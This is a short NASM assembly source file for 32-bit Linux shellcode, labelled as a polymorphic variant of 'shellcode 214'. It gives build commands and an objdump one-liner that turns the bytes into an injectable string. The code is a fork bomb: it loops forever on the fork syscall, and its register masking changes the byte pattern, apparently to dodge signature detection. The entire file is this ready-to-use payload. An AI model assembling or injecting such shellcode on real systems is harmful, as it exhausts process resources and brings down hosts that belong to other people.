; compile with:
; 	nasm -f elf32 shellcode-214-poly.asm
;	ld -o shellcode-214-poly shellcode-214-poly.o
; extract shellcode with:
; 	objdump -d shellcode-214-poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start
section .text
	_start:
		mov al,0x2 ; move the syscall number of fork in al
		and eax,0xf ; mask eax to ensure that the final value of eax is 0x2
		int 0x80 ; interrupt for calling fork syscall
		jmp _start ; infinite loop